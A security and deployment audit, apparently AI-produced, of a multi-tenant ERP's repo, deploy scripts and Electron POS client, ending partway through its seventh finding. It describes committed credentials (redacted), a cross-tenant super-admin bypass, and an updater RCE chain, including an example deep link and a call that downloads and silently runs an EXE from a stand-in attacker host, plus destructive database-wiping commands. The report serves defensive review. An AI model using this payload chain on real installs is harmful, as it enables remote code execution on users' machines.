# DevOps, deployment & repo hygiene — Score 1.5/10

> Branch `feature/multi-tenant` · 2026-10-07 · read-only multi-agent analysis · secrets redacted

## Executive summary

This area is not ready for a sellable multi-tenant SaaS. It is the weakest dimension found so far. The sub-agents' findings were verified against the code. After merging duplicates (the SSH-password findings and the deploy_root_baraa.py tenant-wipe findings) and correcting overstated details, the picture is as follows.

1. **Committed production secrets.** About 80 tracked root Python scripts hardcode the Hostinger SSH password (backup_sroor_db.py:7, publish_windows_version.py:6, deploy_root_baraa.py:12, restore_sroor_db.py:7 and others). Every one of them uses paramiko AutoAddPolicy. 37 to 39 of these scripts are already on origin/main, origin/feature/multi-tenant and erp-hub/main. That one shared-hosting account ([HOSTING_ACCOUNT]) holds the central DB, every tenant DB, every .env and every APP_KEY. Real-format APP_KEYs and MySQL passwords are also committed: deploy_root_baraa.py:85 and :99, deploy_with_mysql.py:42 and :58, fix_shipping_php83.py:28 and :44, backup_sroor_db.py:11, restore_sroor_db.py:11. A deploy webhook token is hardcoded in .github/workflows/deploy.yml:49 and update_webhook.php:4. Production admin logins with a trivial default password appear in the test_live_*.py and seed_fresh_direct.py scripts.

2. **A super-admin bypass that becomes a cross-tenant takeover.** AppServiceProvider.php:37 grants Gate::before to two hardcoded phone numbers. The check runs against the tenant DB's users table. The super-admin routes (routes/api.php:195-218) are protected only by can:super_admin.access, with no central-domain guard. So any tenant admin can create a user with one of those phones and then list, delete or re-point other tenants' databases, or run their migrations.

3. **Remote code execution in the Electron POS client.** The updater runs any URL the renderer supplies, with no signature or checksum check (desktop/main.js:539, nativeUpdater.js). The deep-link host can be controlled through `tenant=`, and the `will-navigate` handler is empty.

4. **There is no real release pipeline.** About 15 deploy_*.py variants plus deploy.sh, deploy.bat and update_webhook.php exist, and they conflict:
   - They swallow failures with `|| true`.
   - They run `git reset --hard origin/main` on the server.
   - They run full `db:seed` or `migrate --seed` in production.
   - Seven scripts run `migrate:fresh --force --seed`, two of them against the live [HOSTING_ACCOUNT] DB.
   - The only SaaS-aware deploy, deploy_root_baraa.py, deploys feature/api-migration, not this branch. On every run it mass-deletes the central `tenant_sroor` row, which orphans its DB but does not drop it, because a builder delete fires no TenantDeleted event. It then migrates only tenant `2m` and wipes 2m's operational data through PopulateRealisticTenantDataCommand, whose `--fresh` option is never checked.
   - No release path migrates all tenant DBs.
   - The CI test job runs from the repo root, but composer.json is in backend/, so tests cannot block a deploy.

5. **Production dumps are about to leak.** About 22 MB of production DB dumps under backups/ are committed in the local, unpushed WIP commit 76f32ce0. deploy_root_baraa.py:30-32 runs `git add .`, `git commit` and `git push`, so the next push publishes them.

**What is solid:** the app-level foundations are good. These include stancl DB-per-tenant with a clean split between central and tenant migrations, a centralized TenantProvisionerService, tenancy migration_parameters with --force, test isolation (sqlite :memory:, sync queue), a Playwright webServer block, the /up health route, composer.lock with a pinned platform, and an app_versions table with a SHA-256 column. The problem is how the system is operated, not how it is built.

**Why the score is 1.5:** production credentials sit in git history, the deploy tooling is destructive, there is a privilege-escalation path across tenants, and RCE is possible on client machines.

## Top risks
- [CRITICAL] The Hostinger SSH password is hardcoded in about 80 tracked root scripts, for example backup_sroor_db.py:7, publish_windows_version.py:6 and deploy_root_baraa.py:12. It is pushed to origin (sroor-cofe-erp) and erp-hub on main, feature/multi-tenant and feature/api-migration, and every script uses paramiko AutoAddPolicy. Anyone with repo read access gets a shell on the account that holds the central DB, every tenant DB, every .env and every APP_KEY. Rotating the password does not remove it from history.
- [CRITICAL] backend/app/Providers/AppServiceProvider.php:37 lets two hardcoded phone numbers bypass Gate::before, and the check runs against the TENANT users table. The super-admin routes in routes/api.php:195-218 have only can:super_admin.access, with no central-only guard. Any tenant admin can create a user with one of those phones and then delete tenants, re-point their DB config or run migrations on them. The same phone list appears in TelescopeServiceProvider.php:82, routes/web.php:38 and the ToggleTenantStatus/OverrideTenantFeature requests.
- [CRITICAL] The Electron updater allows RCE. preload.js:39-40 exposes downloadAndInstall to any loaded origin. main.js:539-542 passes downloadUrl as given. nativeUpdater.js accepts http, follows any redirect, does no host, signature or checksum check, and runs the EXE with spawn('/S'). The deep link `tenant=` lets an attacker choose the host (main.js:26-71), and that URL is saved persistently. will-navigate (main.js:238) is empty.
- [HIGH] Committed production APP_KEYs and MySQL passwords: deploy_root_baraa.py:85/:99 (central DB admin), deploy_to_sroor_subdomain.py:54/:70, deploy_with_mysql.py:42/:58, fix_shipping_php83.py:28/:44, plus backup_sroor_db.py:11 and restore_sroor_db.py:11. The DB password is also passed on the remote command line with --password= (backup_sroor_db.py:34, restore_sroor_db.py:20). There is also a deploy webhook token in .github/workflows/deploy.yml:49 and update_webhook.php:4.
- [HIGH] deploy_root_baraa.py deploys origin/feature/api-migration, not the SaaS branch (lines 71-72). On every run it mass-deletes the central tenant_sroor row (line 124), which leaves the workspace unreachable and its DB orphaned. It migrates only --tenants=2m (line 125). It then runs tenant:populate-realistic-data 2m (line 129), which truncates invoices, payments, stock, items, customers and suppliers without conditions (PopulateRealisticTenantDataCommand.php:107-134; --fresh is never checked and there is no production guard).
- [HIGH] There is no release path that migrates all tenants. tenants:migrate appears only in deploy_root_baraa.py:125 (one tenant) and in a manual super-admin endpoint. deploy.sh:32 runs migrate --force --seed || true, and every cache step also ends in || true. deploy_all_locations.py:46 runs a full db:seed --force in production. The CI deploy fires on every push to main or master, never fails (|| echo), and its test job cannot run because composer.json is in backend/.
- [HIGH] Seven tracked scripts run `php artisan migrate:fresh --force --seed` against production paths with no prompt or backup: fix_shipping_php83.py:63 and deploy_with_mysql.py:79 against the live [HOSTING_ACCOUNT] DB, plus deploy_sroor.py:68, deploy_hostinger_php83.py:50, deploy_hostinger_php84.py:56, deploy_subdomain.py:54 and finish_subdomain.py:45. One mistaken run wipes production.
- [HIGH] About 22 MB of production DB dumps (backups/sroor_prod_2026-09-29.sql.gz and others) are committed in the local, unpushed commit 76f32ce0. The branch is ahead by 1 and .gitignore has no rule for backups/ or *.sql. deploy_root_baraa.py:30-32 runs git add ., commit and push, so the next push or deploy publishes them.
- [HIGH] Production admin credentials, with a trivial default password, are hardcoded in tracked live-test and seed scripts: test_live_browser.py:23-24, test_live_activity_logs.py:13, test_live_touch_pos.py:13, test_production_verification.py:14, test_sidebar_click.py:14, seed_fresh_direct.py:58-69 and verify_production_users.py:26-30. The backend seeders (DatabaseSeeder.php:20-45, TenantSampleSeeder.php:28-29) seed the same defaults, and deploy.sh runs --seed.

## Quick wins
- Today, without pushing anything: reset the local commit 76f32ce0 (soft reset, then recommit without backups/, CSVs or the PDF). Add `backups/`, `*.sql`, `*.sql.gz` and the dump CSVs to .gitignore, and move the dumps to encrypted storage outside the repo.
- Rotate the Hostinger SSH/hPanel password, the central and sroor MySQL passwords, the deploy webhook token and the production admin passwords. Switch SSH to key-only. This is an action for the owner in hPanel and is required whatever happens to git history.
- Remove the hardcoded phone allowlist from AppServiceProvider.php:37/:49, TelescopeServiceProvider.php:82, routes/web.php:38 and the ToggleTenantStatus/OverrideTenantFeature requests. Add a central-only middleware to the super-admin route group in routes/api.php:195-218 that rejects requests when tenancy is initialized.
- Remove lines 124 and 129 from deploy_root_baraa.py and its `git add .` / commit / push block (lines 30-32). Add `if (app()->environment('production')) abort` and an actual --fresh check to PopulateRealisticTenantDataCommand.
- git rm every script that contains migrate:fresh (fix_shipping_php83.py, deploy_with_mysql.py, deploy_sroor.py, deploy_hostinger_php83.py, deploy_hostinger_php84.py, deploy_subdomain.py, finish_subdomain.py), plus deploy_all_locations.py, which runs db:seed --force.
- Electron hotfix: validate the tenant against /^[a-z0-9-]{1,63}$/ and check that the hostname ends with .baraa-solutions.com. Add an origin allowlist in will-navigate and setWindowOpenHandler. Check event.senderFrame.url in every ipcMain.handle. Accept only https on the allowlisted host for downloads, and verify the SHA-256 against app_versions.apk_checksum before spawning.
- Fix CI: run composer install and php artisan test with working-directory backend/. Remove `|| echo` from the deploy step, and move the webhook token into GitHub Secrets after rotating it.
- Enable GitHub secret scanning and push protection on both kamalsroor1/sroor-cofe-erp and kamalsroor1/erp-hub, and check that both repos are private.

## Strategic items
- Purge the secrets from git history on both remotes (git filter-repo or BFG over all *.py/*.php/*.sh/*.bat credential files and update_webhook.php), force-push, ask GitHub support to clear cached views, and have every collaborator re-clone. Do this only after rotating the credentials.
- Retire the about 120 root scripts. Delete the one-off production fixers and the obsolete scripts, the 15 deploy_*.py variants, deploy.sh, deploy.bat, update_webhook.php and sync_sroor.py. Port the useful data fixes (cost sync, FIFO reconcile, invoice total_cost recalc, duplicate-payment soft cancel, publish-app-version) into artisan commands in backend/ that take --tenant and --dry-run and refuse production without confirmation. Keep read-only diagnostics, if needed, in a gitignored ops/ folder that reads credentials from env or ssh-agent.
- Build one CI-driven release pipeline in GitHub Actions with SSH-key secrets. It should deploy from main or a release tag, never feature/api-migration, and use set -euo pipefail with no `|| true`. Steps: build assets, run tests in backend/, then a releases/ + current-symlink deploy, artisan down, migrate --force, tenants:migrate --force (failure stops the deploy), config/route/view cache, up, an /up health check and automatic rollback.
- Move super-admin authorization onto a central-connection user model or guard pinned to the central DB and served only on central domains (api/v1/central/*). Never derive platform privileges from tenant-DB roles or attributes. Reserve central identities so tenants cannot create them.
- Rework Electron updates: use electron-updater with a code-signed NSIS installer published to GitHub Releases or a central endpoint the main process fetches itself, with Authenticode verification. Remove downloadUrl from the renderer API. Apply the same signed or checksum-verified approach to the Android APK flow.
- Per-tenant backups and DR: a scheduled tenant-aware backup command (spatie/laravel-backup or mysqldump --single-transaction per tenant DB, credentials in ~/.my.cnf) shipped encrypted off-host, with retention and regular restore drills. Write runbooks for tenant restore and tenant offboarding.
- Seeder hygiene: split demo and sample seeders (TenantSampleSeeder, RealisticEnterpriseDataSeeder) from production-safe seeders (permissions only). Generate random initial admin passwords on tenant provisioning and force a reset on first login. Never run the full DatabaseSeeder on deploy.
- Plan to move off a single shared-hosting account (Hostinger [HOSTING_ACCOUNT]) to infrastructure with environment separation (staging tenant, least-privilege DB users for each tenant instead of one account user, a supervisor-managed queue worker, centralized logs and alerting) before onboarding paying tenants.

## Strengths
- Sound tenancy core: stancl v3 DB-per-tenant with the Database, Filesystem and Queue bootstrappers, a clean split of 35 tenant migrations and 19 central ones, and tenancy.migration_parameters with --force, so `tenants:migrate` can be added to a release non-interactively.
- Tenant provisioning goes through a single TenantProvisionerService behind TenantProvisionerInterface/ProvisionTenantAction inside $tenant->run(), and stancl's TenantDatabaseAlreadyExists check still runs.
- Test isolation is safe: phpunit.xml uses sqlite :memory:, a sync queue, array cache and session, and turns off Pulse, Telescope and Nightwatch. .env.e2e and run_all_tests.py use an isolated sqlite DB. The Playwright webServer targets 127.0.0.1:8000, not production.
- tests_e2e/config.py already reads credentials and BASE_URL from env vars (E2E_*), which is the right pattern to copy, although its fallback defaults should be removed.
- No Telegram bot tokens, GitHub PATs or third-party API keys were found in tracked files.
- The production DB dumps are still only in a local, unpushed commit, so that leak can be fully prevented.
- Building blocks for a proper pipeline already exist: the /up health route (bootstrap/app.php:13), composer.lock with a pinned platform PHP, Playwright projects for each device, a scheduler queue worker with withoutOverlapping and --max-time=55 for cron-only hosting, and deploy_root_baraa.py's layout with the repo outside public_html (a good base for releases/ plus a symlink).
- app_versions is a central-connection table with version_code, min_version_code, force-update logic and a SHA-256 checksum computed in CreateAppVersionAction inside a DB::transaction. Signed updates only need the client to verify it.
- Electron BrowserWindows use contextIsolation: true. Telescope filters production recording and hides sensitive headers, and Pulse is behind Authorize middleware with 7-day trimming.
- The one-off money scripts wrap their writes in DB::transaction, and backup_sroor_db.py uses mysqldump --single-transaction --routines --triggers --events.

## Findings

### 1. [CRITICAL] Production SSH password for the Hostinger account is hardcoded in about 80 root scripts and pushed to two GitHub repos
- **Location:** `D:/projects/sroor/backup_sroor_db.py:7`
- **Effort:** M
- **Evidence:** The same constants HOST='[SERVER_IP]', PORT=65002, USER='[HOSTING_ACCOUNT]' and PASS=<SSH password> appear in about 80 root *.py files. There are 80 PASS assignments with one distinct value (the hash differs only by quote style). Samples: restore_sroor_db.py:7, check_debts.py:7, deploy_root_baraa.py:12, run_cost_sync.py:7, fix_duplicate_payments.py:7. git grep on the remote-tracking refs finds 37-39 password-bearing scripts each in origin/main, origin/feature/multi-tenant, origin/feature/api-migration, origin/fix/inventory-cost-wac and the second remote erp-hub/main (https://github.com/kamalsroor1/erp-hub.git). Every script also uses paramiko AutoAddPolicy, so the host key is never verified.
- **Impact:** Anyone with read access to either GitHub repo (collaborators, forks, CI, a leaked clone, or the public if a repo is public) gets a shell on the shared-hosting account. That account hosts the central DB ([HOSTING_ACCOUNT]_baraa_central), every tenant DB (prefix [HOSTING_ACCOUNT]_), the sroor and shipping production DBs, every .env and APP_KEY. This means full remote compromise and a cross-tenant data breach for the whole SaaS.
- **Recommendation:** Rotate the Hostinger SSH/hPanel password now and switch to SSH keys only. Then purge the history with git filter-repo or BFG on both origin and erp-hub and force-push, and ask GitHub support to clear cached views. Delete the root scripts (see the migration plan). Any ops tooling that stays should read credentials from env vars or ~/.ssh/config and use RejectPolicy/known_hosts.
- **Verification:** Confirmed from the code; the values are not reproduced here. D:/projects/sroor/backup_sroor_db.py:4-7 sets HOST='[SERVER_IP]', PORT=65002, USER='[HOSTING_ACCOUNT]' and a plaintext SSH password in PASS. Line 11 of the same file also holds a plaintext MySQL password (DB_PASS) for [HOSTING_ACCOUNT]. 80 root *.py files contain a `PASS =` assignment, and all of them use one value once quote style is ignored. 90 root scripts use paramiko AutoAddPolicy, so the host key is never checked. The files are tracked by git: `git ls-files` lists backup_sroor_db.py and restore_sroor_db.py, and .gitignore has no rule that excludes these scripts. On the remote-tracking refs, git grep finds password-bearing scripts in 37 files on origin/main, 38 on origin/feature/multi-tenant and 36 on erp-hub/main. The remotes are github.com/kamalsroor1/sroor-cofe-erp and github.com/kamalsroor1/erp-hub. I found no guard that reduces the risk, such as an env var lookup, git-crypt or a secrets manager. Two things I could not check: whether the repos are public, and whether the password is still valid. Even so, anyone with read access to the repos or their history can get SSH and DB access to the shared-hosting account that holds the production and tenant DBs. Rotating the password does not remove it from git history, so critical severity is justified.

### 2. [CRITICAL] Hardcoded phone numbers grant super-admin in every tenant DB (cross-tenant takeover via tenant lifecycle endpoints)
- **Location:** `backend/app/Providers/AppServiceProvider.php:37`
- **Effort:** M
- **Evidence:** Gate::before returns true when `$user->hasRole('super_admin') || in_array($user->phone, [<two hardcoded phones>])`. The check runs against whichever users table is active, which is the tenant DB once tenancy is initialized. The super-admin routes (create/delete tenant, update-db-config, run-migrations, impersonate) sit in routes/api.php:195-212 under the normal tenant-aware group with only `can:super_admin.access`. TenantSampleSeeder.php:28 also provisions the demo tenant admin with one of those phones. DatabaseSeeder seeds the same phones with default passwords ('password' / '[REDACTED_PASSWORD]'), and deploy.sh runs `migrate --force --seed` on every deploy.
- **Impact:** Any tenant admin can create a user in their own tenant DB with one of the two hardcoded phones. That user passes every gate, including super_admin.access. They can then list, impersonate, re-point DB credentials for, run migrations on, or delete any other tenant. This is a full cross-tenant compromise.
- **Recommendation:** Remove the phone allowlist. Authorize super-admin only against a central-connection user/guard (CentralUser with a pinned connection), and only on central domains (`api/v1/central/*` + PreventAccessFromCentralDomains inverse). Never authorize from tenant-DB roles. Remove default passwords from seeders and stop running the full DatabaseSeeder on deploy.
- **Verification:** I confirmed this in the code. Only one detail is overstated.

1. **The gate grants super-admin by phone.** In backend/app/Providers/AppServiceProvider.php:37-45, Gate::before returns true when `hasRole('super_admin') || in_array($user->phone, [two hardcoded phone numbers])`. The phone check runs before the branch that denies `super_admin.*` abilities, so a matching phone passes `super_admin.access`. viewPulse at line 49 uses the same phone list. So do TelescopeServiceProvider.php:82, routes/web.php:38, ToggleTenantStatusRequest:13 and OverrideTenantFeatureRequest:13.

2. **The user is resolved from the tenant DB.** ResolveApiTenancy runs on the whole /api/v1 group. It starts tenancy from the X-Tenant header, the `?tenant=` value or a subdomain host. ApiTokenAuth then looks up the user with `User::` / PersonalAccessToken in the current connection, which is the tenant DB. So `$user->phone` comes from the tenant's own users table.

3. **No guard blocks the super-admin routes in tenant context.** In routes/api.php:195-218 the super-admin group is guarded only by `can:super_admin.access`. There is no PreventAccessFromCentralDomains or central-only middleware. bootstrap/app.php adds no global guard either.

4. **The controller acts on the central DB.** The stancl BaseTenant model uses the central connection, so `Tenant::findOrFail`, destroy, update-db-config and run-migrations all work on central tenant records even from tenant context. The form requests do not stop it: StoreTenantRequest::authorize returns true, and the UpdateTenantDatabaseConfig and UpdateTenantUnits requests even accept `hasRole('admin')`.

5. **A tenant admin can create such a user.** StoreUserRequest allows admin, users.manage or roles.manage. Its phone rule is `unique:users,phone`, which is checked against the tenant DB only. Nothing in that rule blocks the reserved numbers.

6. **The seed and deploy path makes it worse.** TenantSampleSeeder.php:28 provisions the demo tenant owner with one of these phones and the password 'password'. DatabaseSeeder.php:20-45 seeds both phones with default passwords and calls TenantSampleSeeder. deploy.sh:32 runs `artisan migrate --force --seed`.

**What is overstated:** "impersonate" is not one of the api.php super-admin endpoints. The impersonate routes live in routes/tenant.php:33. The rest of the chain is confirmed: list, create and delete tenants, re-point DB credentials, run migrations, toggle status and override features. It gives cross-tenant takeover and lets an attacker point other tenants' databases at hosts they control, so critical stands.

### 3. [CRITICAL] Electron desktop: a crafted link or XSS can run any downloaded EXE silently on POS machines
- **Location:** `desktop/main.js:539`
- **Effort:** M
- **Evidence:** preload.js exposes window.electronAPI.updater.downloadAndInstall(data) to whatever page is loaded in mainWindow. The main.js:539-542 IPC handler passes data.downloadUrl straight to nativeUpdater.downloadAndApplyUpdate. That function (desktop/src/updater/nativeUpdater.js) accepts http or https, follows any redirect, does not check the host, signature or SHA-256 (app_versions.apk_checksum is never sent to or checked by the client), then runs spawn(updateExePath, ['/S'], {detached:true}). The 'will-navigate' handler (main.js:238-240) is empty, so the window can go to any origin and keep the preload. The deep-link parser (main.js:26-47, 64-71) builds `https://${tenant}.baraa-solutions.com` from the unvalidated ?tenant= value, so tenant=evil.com/x? resolves to host evil.com. config:save-settings (main.js:508) also lets any loaded page set serverUrl permanently. None of the IPC handlers check event.senderFrame.
- **Impact:** Remote code execution on every tenant's Windows POS machine. Three routes lead there: an attacker sends a link like sroor://connect?tenant=attacker.tld/x?; any stored XSS on any tenant subdomain calls the updater; or the page links out to an external site. The attacker's page then calls electronAPI.updater.downloadAndInstall({downloadUrl:'http://attacker/payload.exe'}) and it runs silently. One tenant's XSS reaches every desktop install that loads that origin.
- **Recommendation:** Validate the tenant against /^[a-z0-9-]{1,63}$/ and build the URL with new URL(), checking hostname ends with .baraa-solutions.com. Add an origin allowlist in will-navigate and setWindowOpenHandler. In each ipcMain.handle, reject calls whose event.senderFrame.url is not on the allowlist. Remove downloadUrl from the renderer API: the main process should fetch the update metadata itself from the central API (or GitHub Releases), accept https only on an allowlisted host, check the SHA-256 against apk_checksum and check the Authenticode signature before running it. A better option is electron-updater with a code-signed NSIS installer, publishing to GitHub Releases.
- **Verification:** I confirmed the finding from the code and found no guard anywhere in the chain.

1. **The updater is exposed to any page.** desktop/preload.js:39-40 exposes `electronAPI.updater.downloadAndInstall(data)` through contextBridge to whatever page mainWindow loads. The window is set up at desktop/main.js:148-154 with the preload, contextIsolation on and no origin restriction.

2. **The download URL is used as given.** The IPC handler at main.js:539-542 passes `data.downloadUrl` (or `download_url`) straight to `downloadAndApplyUpdate`. It never checks `event.senderFrame` or the origin. None of the IPC handlers in main.js:388-542 do.

3. **The downloaded file runs silently with no checks.** In desktop/src/updater/nativeUpdater.js:
   - It accepts plain http (line 11).
   - It follows any redirect without checking the host or the number of hops (lines 15-18).
   - It does no signature, checksum or host check.
   - It runs `spawn(updateExePath, ['/S'], {detached:true})` (lines 98-102) and then calls `app.exit(0)`.

4. **The window can go to any origin.** The `will-navigate` handler at main.js:238-240 is empty, and there is no `setWindowOpenHandler`.

5. **The deep link lets an attacker pick the host.** main.js:26-33 takes `tenant` from the query string with only trim/lowercase. Lines 42 and 67 then build `https://${tenant}.baraa-solutions.com`. A value like `evil.tld#` or `evil.tld/x?` makes `evil.tld` the host. That URL is saved as `serverUrl` (lines 45 and 69) and is loaded first on every later start (lines 73-77), so the attacker origin stays loaded and keeps the preload across restarts.

6. **Any loaded page can redirect the app permanently.** `config:save-settings` (main.js:508-517) lets the page set `serverUrl` for good and navigate the window there.

**Why I kept the severity at critical:** the legitimate frontend already calls this API (backend/resources/js/Composables/useAppUpdate.js:191), so the API is live on production installs, not dead code. The deep-link route needs one user click plus the browser's "open app" prompt. The XSS route needs a separate XSS bug to exist first. Even so, the result is one-click remote code execution that survives restarts on the Windows POS machines, with no server-side guard that could stop it.

### 4. [CRITICAL] Hostinger SSH credentials are hardcoded in tracked scripts already pushed to origin
- **Location:** `publish_windows_version.py:6`
- **Effort:** M
- **Evidence:** publish_windows_version.py:3-6 and deploy_header_version.py:4-7 hardcode the server IP, SSH port, username and an SSH password (type: Hostinger SSH/SFTP password). Both are on origin/feature/multi-tenant and origin/feature/api-migration. In total, 38 tracked .py/.php/.bat/.sh files on origin/feature/multi-tenant and 37 on origin/main contain password assignments.
- **Impact:** Anyone with read access to the GitHub repo, a fork or a clone gets shell access to the production host that serves the tenants: data theft, tampering with invoices, or planting a malicious APK/EXE that the update flow then distributes.
- **Recommendation:** Rotate the SSH password now and switch to key-only SSH. Move the scripts out of the repo, or have them read credentials from environment variables or a vault. Purge them from history (git filter-repo) on both remotes. Enable GitHub secret scanning and push protection.
- **Verification:** The main claim holds. D:\projects\sroor\publish_windows_version.py:3-6 hardcodes the host IP, a non-standard SSH port, the Hostinger account username and `PASS` as a plaintext string. The password is not read from os.environ or getenv. Lines 10-12 pass it straight to paramiko `ssh.connect(..., password=PASS)` with AutoAddPolicy. Its REPO_DIR points at the production erp_repo/backend. The file is tracked and on origin: git ls-tree shows it on origin/feature/multi-tenant, and `git branch -r --contains` shows both origin/feature/api-migration and origin/feature/multi-tenant. It was last changed on 2026-08-29.

Part of the evidence is wrong. D:\projects\sroor\deploy_header_version.py:4-7 does contain the same credential type (literal `PASS`, same host and user). But its only commit is the local, unpushed 76f32ce0 "WIP: epitaxy pre-switch". The branch is ahead of origin by 1, and the file is on none of origin/feature/multi-tenant, origin/main or origin/feature/api-migration.

The file counts check out roughly. 38 .py files on origin/feature/multi-tenant start a line with a literal `PASS`/`PASSWORD =` string assignment. A broader password regex over .py/.php/.bat/.sh files gives 48 on that branch and 47 on origin/main. .gitignore excludes none of these scripts.

Nothing in the code reduces the risk: no secret manager or env-var fallback, and the password is in git history, so deleting the file would not remove it. I could not check whether the GitHub repo (kamalsroor1/sroor-cofe-erp, plus the erp-hub remote) is public or private, so "anyone" really means anyone with repo or clone access. Even so, a plaintext production shell password pushed to a remote, on a host serving every tenant, still rates critical. The password needs rotating; removing the file is not enough.

### 5. [HIGH] Production DB dumps (22 MB of customer PII, password hashes and financials) are committed in the local unpushed WIP commit, and deploy_root_baraa.py would push them
- **Location:** `D:/projects/sroor/backups/sroor_prod_2026-09-29.sql.gz`
- **Effort:** S
- **Evidence:** git ls-files shows these are tracked: backups/sroor_backup_20260831_151852.sql(.gz), backups/sroor_backup_latest.sql, backups/sroor_prod_2026-09-29.sql.gz and backups/sroor_prod_copy_before_recost_2026-09-29.sql.gz, about 22 MB in total. They were added in commit 76f32ce0 'WIP: epitaxy pre-switch' (94 files changed). git status says '[ahead 1]' and no remote branch contains 76f32ce0, so they have NOT been pushed yet. .gitignore has no rule for backups/ or *.sql. deploy_root_baraa.py:30-32 runs `git add .`, `git commit` and `git push` before deploying.
- **Impact:** The next `git push` on this branch, or any run of deploy_root_baraa.py, publishes full production database dumps to GitHub: customers, phones, balances, invoices, bcrypt hashes and possibly tokens/sessions. The data is irreversibly exposed and the business takes on privacy liability.
- **Recommendation:** Do NOT push this branch as it is. Rewrite the local commit (soft reset, then recommit without backups/) or use filter-repo. Add `backups/`, `*.sql`, `*.sql.gz` and `*.csv` dumps to .gitignore and store dumps outside the repo, encrypted. Remove `git add .` from the deploy scripts.
- **Verification:** The finding is real. I checked it read-only with git metadata, .gitignore and deploy_root_baraa.py. Permission was denied for reading the dump contents, so I could not open them.

What I confirmed:
- `git ls-files -s backups` shows all of these are tracked: backups/sroor_backup_20260831_151852.sql, backups/sroor_backup_20260831_151852.sql.gz, backups/sroor_backup_latest.sql, backups/sroor_prod_2026-09-29.sql.gz and backups/sroor_prod_copy_before_recost_2026-09-29.sql.gz.
- `git show --stat 76f32ce0 -- backups` shows they were all added in commit 76f32ce0 "WIP: epitaxy pre-switch". That commit adds 28 files under backups/: two ~21,806-line .sql files, one ~0.9 MB .gz and two ~2.9 MB .gz. The same commit also adds cost-audit CSVs, screenshots and a 2.9 MB PDF report.
- 76f32ce0 is the only commit that touches the dump. `git status -sb` shows "[ahead 1]" against origin/feature/multi-tenant, and `git branch -r --contains 76f32ce0` returns nothing, so the dumps are not pushed yet.
- .gitignore has no rule for backups/ or *.sql. Its only related entries are .env.backup and *.sqlite (lines 4 and 34-38).
- deploy_root_baraa.py:30-32 runs `git add .`, then `git commit`, then `git push` (with check=True) before it opens SSH.

So the next push of this branch, or the next run of that deploy script, would upload the dumps to github.com/kamalsroor1/sroor-cofe-erp. There is also a second remote, erp-hub.

Why I lowered the severity from critical to high:
- Nothing has been exposed yet; the commit is local only.
- I could not tell whether the GitHub repos are private, which would limit exposure to collaborators.
- I could not inspect the dump contents. The claim of PII, password hashes and tokens is inferred from the file names ("sroor_prod_...") and their size, not verified.

Removing the files from the working tree is not enough. Because they are already committed, the fix needs a rewrite or reset of 76f32ce0 before any push, plus a .gitignore rule for backups/ and *.sql*.

A related problem I found while checking: deploy_root_baraa.py:12 hardcodes an SSH password for the production host in plain text.

### 6. [HIGH] Several deploy scripts run `migrate:fresh --force --seed` against production paths, and two point at the live sroor MySQL DB
- **Location:** `D:/projects/sroor/fix_shipping_php83.py:63`
- **Effort:** S
- **Evidence:** fix_shipping_php83.py:18 runs cd .../shipping.baraa-solutions.com/public_html, line 42 writes a .env with DB_DATABASE=[HOSTING_ACCOUNT] (the live sroor DB, the same one backup_sroor_db.py dumps), and line 63 runs `php artisan migrate:fresh --force --seed`. deploy_with_mysql.py:29/56/79 does the same against baraa-solutions.com/public_html/sroor with DB_DATABASE=[HOSTING_ACCOUNT]. migrate:fresh on production paths also appears in deploy_sroor.py:68, deploy_hostinger_php83.py:50, deploy_hostinger_php84.py:56, deploy_subdomain.py:54 and finish_subdomain.py:45. None of them asks for confirmation or takes a backup first.
- **Impact:** One accidental run, for example someone picking the 'deploy' script that looks right, drops every table in the production sroor database. All invoices, payments, stock and customer balances are lost, with recovery only from whatever dump exists.
- **Recommendation:** Delete these scripts. Production deploys must never contain migrate:fresh, db:wipe or full db:seed. If a bootstrap script is needed, it belongs in a guarded artisan command that refuses to run when APP_ENV=production.
- **Verification:** Confirmed in the code. In fix_shipping_php83.py, line 18 cds into the shipping.baraa-solutions.com/public_html path, line 42 writes DB_DATABASE=[HOSTING_ACCOUNT], and line 63 runs `php artisan migrate:fresh --force --seed`. The script opens a paramiko SSH session to the Hostinger host, the commands run under `set -e`, and nothing asks for input or confirmation first. deploy_with_mysql.py lines 29, 56 and 79 do the same against baraa-solutions.com/public_html/sroor with the same database name. That is the database backup_sroor_db.py dumps (its line 9 sets DB_NAME to the same value). migrate:fresh --force --seed also appears at deploy_sroor.py:68, deploy_hostinger_php83.py:50, deploy_hostinger_php84.py:56, deploy_subdomain.py:54 and finish_subdomain.py:45. I found no backup step and no prompt in these scripts, and all of them are tracked in git. Related problems in the same files: each script hardcodes the SSH password (fix_shipping_php83.py:9, deploy_with_mysql.py:9), fix_shipping_php83.py also hardcodes a DB password and APP_KEY in its .env heredoc, and the scripts run `git reset --hard origin/main` on the server. I lowered the severity from critical to high because the damage only happens if a person runs one of these scripts by hand. Nothing triggers them automatically (no CI or app code path). Still, there is no guard at all, and one mistaken run would wipe the production database.

### 7. [HIGH] The SaaS deploy script deletes a tenant (dropping its DB) and wipes and repopulates tenant '2m' with fake data on every deploy
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:124`
- **Effort:** M
- **Evidence:** Line 124 runs `artisan tinker --execute="\App\Models\Tenant::where('id','tenant_sroor')->delete();" || true`. TenancyServiceProvider.php:39-44 maps TenantDeleted to Jobs\DeleteDatabase with shouldBeQueued(false), so the tenant DB is dropped synchronously. Line 125 migrates only `--tenants=2m`. Line 129 runs `tenant:populate-realistic-data 2m`. PopulateRealisticTenantDataCommand.php:107-129 runs the 'Wiping previous operational data...' step, which truncates InvoiceItem, Payment, Invoice, Purchase, StockMovement, Expense, CashShift and StoreStock, whether or not --fresh is passed. The script also deploys branch feature/api-migration (line 72), not feature/multi-tenant.
- **Impact:** If 2m, or the tenant_sroor workspace, is or becomes a paying customer, every deploy destroys that tenant's sales, payments and stock history. Every other tenant DB is never migrated on deploy, so their schemas drift and requests fail after a release. The branch production runs is not the SaaS branch.
- **Recommendation:** Remove the tenant delete, the populate step and the single-tenant migrate from the deploy path. Run `tenants:migrate --force` for all tenants, with failure stopping the deploy. Gate PopulateRealisticTenantDataCommand so it refuses production and requires --fresh plus an interactive confirmation. Deploy from a release tag or main, built in CI.
- **Verification:** Mostly confirmed, but one part is overstated.

**Confirmed from the code:**
- `deploy_root_baraa.py` is tracked (recent release commits touch it) and targets production on baraa-solutions.com.
- Lines 71-72 check out and hard-reset to `origin/feature/api-migration`, not `feature/multi-tenant`.
- Line 124 deletes the central `tenant_sroor` row on every run.
- Line 125 runs `tenants:migrate --tenants=2m` only, so no other tenant DB is migrated on deploy and their schemas will drift.
